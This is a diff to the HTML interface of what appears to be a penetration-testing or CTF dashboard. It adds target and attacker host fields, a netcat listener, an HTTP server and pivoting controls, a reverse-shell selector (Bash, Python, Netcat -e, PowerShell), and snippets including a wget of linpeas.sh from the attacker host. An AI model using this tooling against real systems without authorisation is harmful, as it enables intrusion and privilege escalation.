@@ -15,6 +15,14 @@
         </div>
 
         <div class="ms-auto d-flex align-items-center">
+            <!-- Variables -->
+            <div class="input-group input-group-sm me-3" style="width: 280px;">
+                <span class="input-group-text bg-dark border-secondary text-light">RHOST</span>
+                <input type="text" class="form-control bg-black text-light border-secondary" id="var-rhost" placeholder="10.10.x.x">
+                <span class="input-group-text bg-dark border-secondary text-light">LHOST</span>
+                <input type="text" class="form-control bg-black text-light border-secondary" id="var-lhost" placeholder="10.10.14.x">
+            </div>
+
             <!-- VPN Selector & Status -->
             <select class="form-select form-select-sm bg-black text-light border-secondary me-2" id="vpn-config-select" style="width: 150px;">
                 <option value="">Select VPN...</option>
@@ -46,99 +54,195 @@
                 <!-- Terminals injected here -->
             </div>
 
-            <!-- Notes Area -->
+            <!-- Bottom Panel: Notes & Files (Tabbed) -->
             <div id="notes-wrapper" class="bg-black border-top border-secondary d-flex flex-column">
-                <div class="d-flex border-bottom border-secondary bg-dark p-1 align-items-center">
-                    <span class="text-light small fw-bold me-3 ps-2">Notes</span>
-                    <button class="btn btn-sm btn-primary py-0 me-2" id="btn-new-note" style="font-size: 0.7rem;">+ New Note</button>
-                    <!-- Tabs for open notes could go here -->
-                </div>
-                <div class="d-flex flex-grow-1 overflow-hidden">
-                    <!-- Note List -->
-                    <div class="border-end border-secondary p-0" style="width: 200px; overflow-y: auto;" id="notes-list-container">
-                        <div class="list-group list-group-flush" id="notes-list">
-                            <!-- Notes List injected here -->
+                <ul class="nav nav-tabs bg-dark border-bottom border-secondary pt-1 px-1" style="font-size: 0.75rem;">
+                    <li class="nav-item">
+                        <button class="nav-link active py-1 px-2 text-light bg-black border-secondary" id="tab-btn-notes" data-bs-toggle="tab" data-bs-target="#tab-notes" type="button">Notes</button>
+                    </li>
+                    <li class="nav-item">
+                        <button class="nav-link py-1 px-2 text-secondary" id="tab-btn-files" data-bs-toggle="tab" data-bs-target="#tab-files" type="button">File Manager (shared/)</button>
+                    </li>
+                </ul>
+
+                <div class="tab-content flex-grow-1 overflow-hidden d-flex">
+                    <!-- Notes Tab -->
+                    <div class="tab-pane fade show active flex-grow-1 w-100" id="tab-notes">
+                        <div class="d-flex h-100 flex-column">
+                             <div class="d-flex border-bottom border-secondary bg-dark p-1 align-items-center">
+                                <button class="btn btn-sm btn-primary py-0 me-2" id="btn-new-note" style="font-size: 0.7rem;">+ New Note</button>
+                            </div>
+                            <div class="d-flex flex-grow-1 overflow-hidden">
+                                <div class="border-end border-secondary p-0" style="width: 200px; overflow-y: auto;" id="notes-list-container">
+                                    <div class="list-group list-group-flush" id="notes-list"></div>
+                                </div>
+                                <div class="flex-grow-1 d-flex flex-column p-2" id="note-editor" style="display: none !important;">
+                                     <input type="text" class="form-control form-control-sm bg-black text-light border-secondary mb-1" id="note-title" placeholder="Title">
+                                     <textarea class="form-control form-control-sm bg-black text-light border-secondary flex-grow-1" id="note-content" placeholder="Content..."></textarea>
+                                     <div class="d-grid mt-1">
+                                         <button class="btn btn-sm btn-success py-0" id="btn-save-note">Save</button>
+                                     </div>
+                                </div>
+                                <div class="flex-grow-1 d-flex align-items-center justify-content-center text-secondary small" id="no-note-selected">
+                                    Select a note to edit
+                                </div>
+                            </div>
                         </div>
                     </div>
-                    <!-- Editor -->
-                    <div class="flex-grow-1 d-flex flex-column p-2" id="note-editor" style="display: none !important;">
-                         <input type="text" class="form-control form-control-sm bg-black text-light border-secondary mb-1" id="note-title" placeholder="Title">
-                         <textarea class="form-control form-control-sm bg-black text-light border-secondary flex-grow-1" id="note-content" placeholder="Content..."></textarea>
-                         <div class="d-grid mt-1">
-                             <button class="btn btn-sm btn-success py-0" id="btn-save-note">Save</button>
+
+                    <!-- Files Tab -->
+                    <div class="tab-pane fade flex-grow-1 w-100" id="tab-files">
+                         <div class="d-flex h-100 flex-column p-2">
+                             <div class="d-flex justify-content-between mb-2">
+                                 <button class="btn btn-sm btn-secondary py-0" id="btn-refresh-files"><i class="bi bi-arrow-clockwise"></i> Refresh</button>
+                                 <div class="input-group input-group-sm w-auto">
+                                     <input type="file" class="form-control bg-dark text-light border-secondary" id="file-upload-input">
+                                     <button class="btn btn-success" id="btn-upload-file">Upload</button>
+                                 </div>
+                             </div>
+                             <div class="flex-grow-1 overflow-auto border border-secondary bg-black">
+                                 <table class="table table-dark table-hover table-sm small-font mb-0">
+                                     <thead>
+                                         <tr>
+                                             <th>Name</th>
+                                             <th>Size</th>
+                                             <th class="text-end">Actions</th>
+                                         </tr>
+                                     </thead>
+                                     <tbody id="file-list-body"></tbody>
+                                 </table>
+                             </div>
                          </div>
-                    </div>
-                    <div class="flex-grow-1 d-flex align-items-center justify-content-center text-secondary small" id="no-note-selected">
-                        Select a note to edit
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- Right Panel: Tools -->
-        <div id="right-panel" class="bg-black border-start border-secondary p-2 d-flex flex-column small-font">
+        <!-- Right Panel: Tools Accordion -->
+        <div id="right-panel" class="bg-black border-start border-secondary d-flex flex-column small-font overflow-auto">
 
-            <!-- Quick SSH -->
-            <h6 class="text-secondary text-uppercase fw-bold mb-2" style="font-size: 0.7rem;">Quick SSH</h6>
-            <div class="input-group input-group-sm mb-3">
-                <input type="text" class="form-control bg-dark text-light border-secondary" placeholder="user@ip" id="ssh-target" style="font-size: 0.75rem;">
-                <button class="btn btn-primary" id="btn-quick-ssh" style="font-size: 0.75rem;">Connect</button>
-            </div>
+            <div class="accordion accordion-flush" id="toolsAccordion">
 
-            <!-- Tools -->
-            <h6 class="text-secondary text-uppercase fw-bold mb-2" style="font-size: 0.7rem;">Tools</h6>
-
-            <!-- WebDAV -->
-            <div class="card bg-dark border-secondary mb-2">
-                <div class="card-header p-1 text-white" style="font-size: 0.75rem;">WebDAV</div>
-                <div class="card-body p-2">
-                    <div class="input-group input-group-sm mb-2">
-                        <span class="input-group-text bg-secondary border-secondary text-light p-1" style="font-size: 0.7rem;">Port</span>
-                        <input type="number" class="form-control bg-black text-light border-secondary p-1" id="webdav-port" value="8080" style="font-size: 0.75rem;">
-                    </div>
-                    <div class="d-grid">
-                                <button class="btn btn-sm btn-warning py-0" id="btn-webdav-toggle" style="font-size: 0.75rem;">Start WebDAV</button>
-                    </div>
-                    <div class="mt-1 text-muted text-truncate" id="webdav-status" style="font-size: 0.65rem;">
-                        Status: Stopped
-                    </div>
-                </div>
-            </div>
-
-            <!-- Target / Nmap -->
-            <h6 class="text-secondary text-uppercase fw-bold mb-2" style="font-size: 0.7rem;">Target Scan</h6>
-                    <div class="mb-3">
-                <input type="text" class="form-control form-control-sm bg-dark text-light border-secondary mb-2" placeholder="Nmap Command" id="nmap-command" value="nmap -sC -sV " style="font-size: 0.75rem;">
-                <div class="d-grid gap-2">
-                    <button class="btn btn-sm btn-danger py-0" type="button" id="btn-nmap-run" style="font-size: 0.75rem;">Run Scan</button>
-                    <button class="btn btn-sm btn-light py-0" type="button" id="btn-nmap-save" style="font-size: 0.75rem;">Save Output</button>
-                </div>
-            </div>
-
-                    <!-- Netcat -->
-                    <h6 class="text-secondary text-uppercase fw-bold mb-2" style="font-size: 0.7rem;">Netcat Listener</h6>
-                    <div class="card bg-dark border-secondary mb-3">
-                        <div class="card-body p-2">
-                            <div class="input-group input-group-sm mb-2">
-                                <span class="input-group-text bg-secondary border-secondary text-light p-1" style="font-size: 0.7rem;">Port</span>
-                                <input type="number" class="form-control bg-black text-light border-secondary p-1" id="nc-port" value="4444" style="font-size: 0.75rem;">
+                <!-- 1. Tools (Standard) -->
+                <div class="accordion-item bg-black border-bottom border-secondary">
+                    <h2 class="accordion-header" id="headingTools">
+                        <button class="accordion-button py-2 bg-dark text-light collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTools">
+                            <i class="bi bi-tools me-2"></i> Standard Tools
+                        </button>
+                    </h2>
+                    <div id="collapseTools" class="accordion-collapse collapse show" data-bs-parent="#toolsAccordion">
+                        <div class="accordion-body p-2">
+                            <!-- Quick SSH -->
+                            <div class="input-group input-group-sm mb-3">
+                                <input type="text" class="form-control bg-dark text-light border-secondary" placeholder="user@ip" id="ssh-target" style="font-size: 0.75rem;">
+                                <button class="btn btn-primary" id="btn-quick-ssh">SSH</button>
                             </div>
-                            <div class="d-grid">
-                                <button class="btn btn-sm btn-warning py-0" id="btn-nc-listen" style="font-size: 0.75rem;">Start Listener (nc -lvnp)</button>
+
+                            <!-- WebDAV -->
+                            <div class="card bg-dark border-secondary mb-2">
+                                <div class="card-header p-1 text-white" style="font-size: 0.75rem;">WebDAV</div>
+                                <div class="card-body p-2">
+                                    <div class="input-group input-group-sm mb-2">
+                                        <input type="number" class="form-control bg-black text-light border-secondary p-1" id="webdav-port" value="8080">
+                                        <button class="btn btn-sm btn-outline-warning py-0" id="btn-webdav-toggle">Start</button>
+                                    </div>
+                                    <div class="text-muted text-truncate" id="webdav-status" style="font-size: 0.65rem;">Stopped</div>
+                                </div>
+                            </div>
+
+                            <!-- Simple HTTP -->
+                            <div class="card bg-dark border-secondary mb-2">
+                                <div class="card-header p-1 text-white" style="font-size: 0.75rem;">HTTP Server (py3)</div>
+                                <div class="card-body p-2">
+                                    <div class="input-group input-group-sm mb-2">
+                                        <input type="number" class="form-control bg-black text-light border-secondary p-1" id="http-port" value="8000">
+                                        <button class="btn btn-sm btn-outline-warning py-0" id="btn-http-toggle">Start</button>
+                                    </div>
+                                    <div class="text-muted text-truncate" id="http-status" style="font-size: 0.65rem;">Stopped</div>
+                                </div>
+                            </div>
+
+                            <!-- Netcat -->
+                            <div class="card bg-dark border-secondary mb-2">
+                                <div class="card-body p-2">
+                                    <label class="text-secondary small">Netcat Listener</label>
+                                    <div class="input-group input-group-sm">
+                                        <input type="number" class="form-control bg-black text-light border-secondary p-1" id="nc-port" value="4444">
+                                        <button class="btn btn-sm btn-warning py-0" id="btn-nc-listen">Listen</button>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Ligolo -->
+                            <div class="d-grid gap-1 mt-2">
+                                <button class="btn btn-sm btn-info py-0" id="btn-ligolo-proxy">Ligolo Proxy</button>
+                                <button class="btn btn-sm btn-light py-0" id="btn-ligolo-agent">Ligolo Agent</button>
                             </div>
                         </div>
                     </div>
+                </div>
 
-                    <!-- Ligolo-ng -->
-                    <h6 class="text-secondary text-uppercase fw-bold mb-2" style="font-size: 0.7rem;">Ligolo-ng</h6>
-                    <div class="card bg-dark border-secondary mb-2">
-                        <div class="card-body p-2">
+                <!-- 2. Target & Scans -->
+                <div class="accordion-item bg-black border-bottom border-secondary">
+                    <h2 class="accordion-header" id="headingScan">
+                        <button class="accordion-button py-2 bg-dark text-light collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseScan">
+                            <i class="bi bi-radar me-2"></i> Scan & Enum
+                        </button>
+                    </h2>
+                    <div id="collapseScan" class="accordion-collapse collapse" data-bs-parent="#toolsAccordion">
+                        <div class="accordion-body p-2">
+                            <input type="text" class="form-control form-control-sm bg-dark text-light border-secondary mb-2" placeholder="Nmap Command" id="nmap-command" value="nmap -sC -sV {RHOST}" style="font-size: 0.75rem;">
                             <div class="d-grid gap-2">
-                                <button class="btn btn-sm btn-info py-0" id="btn-ligolo-proxy" style="font-size: 0.75rem;">Start Proxy (Sudo)</button>
-                                <button class="btn btn-sm btn-light py-0" id="btn-ligolo-agent" style="font-size: 0.75rem;">Connect Agent</button>
+                                <button class="btn btn-sm btn-danger py-0" type="button" id="btn-nmap-run">Run Scan</button>
+                                <button class="btn btn-sm btn-light py-0" type="button" id="btn-nmap-save">Save Output</button>
                             </div>
                         </div>
                     </div>
+                </div>
+
+                <!-- 3. Reverse Shells -->
+                <div class="accordion-item bg-black border-bottom border-secondary">
+                    <h2 class="accordion-header" id="headingShells">
+                        <button class="accordion-button py-2 bg-dark text-light collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseShells">
+                            <i class="bi bi-terminal me-2"></i> RevShells
+                        </button>
+                    </h2>
+                    <div id="collapseShells" class="accordion-collapse collapse" data-bs-parent="#toolsAccordion">
+                        <div class="accordion-body p-2">
+                            <select class="form-select form-select-sm bg-dark text-light border-secondary mb-2" id="revshell-type">
+                                <option value="bash">Bash -i</option>
+                                <option value="python">Python3 PTY</option>
+                                <option value="nc">Netcat -e</option>
+                                <option value="powershell">PowerShell</option>
+                            </select>
+                            <textarea class="form-control form-control-sm bg-black text-light border-secondary mb-2" id="revshell-output" rows="3" readonly></textarea>
+                            <div class="d-grid">
+                                <button class="btn btn-sm btn-primary py-0" id="btn-copy-revshell">Copy to Clipboard</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                 <!-- 4. Snippets -->
+                <div class="accordion-item bg-black border-bottom border-secondary">
+                    <h2 class="accordion-header" id="headingSnippets">
+                        <button class="accordion-button py-2 bg-dark text-light collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseSnippets">
+                            <i class="bi bi-lightning me-2"></i> Snippets
+                        </button>
+                    </h2>
+                    <div id="collapseSnippets" class="accordion-collapse collapse" data-bs-parent="#toolsAccordion">
+                        <div class="accordion-body p-2">
+                            <div class="list-group">
+                                <button class="list-group-item list-group-item-action bg-dark text-light small py-1 snippet-btn" data-cmd="python3 -c 'import pty; pty.spawn(\042/bin/bash\042)'">Upgrade TTY (Py3)</button>
+                                <button class="list-group-item list-group-item-action bg-dark text-light small py-1 snippet-btn" data-cmd="export TERM=xterm">Export TERM</button>
+                                <button class="list-group-item list-group-item-action bg-dark text-light small py-1 snippet-btn" data-cmd="stty raw -echo; fg">Fix Stty</button>
+                                <button class="list-group-item list-group-item-action bg-dark text-light small py-1 snippet-btn" data-cmd="wget http://{LHOST}:8000/linpeas.sh">Wget Linpeas</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
         </div>
     </div>
 </div>
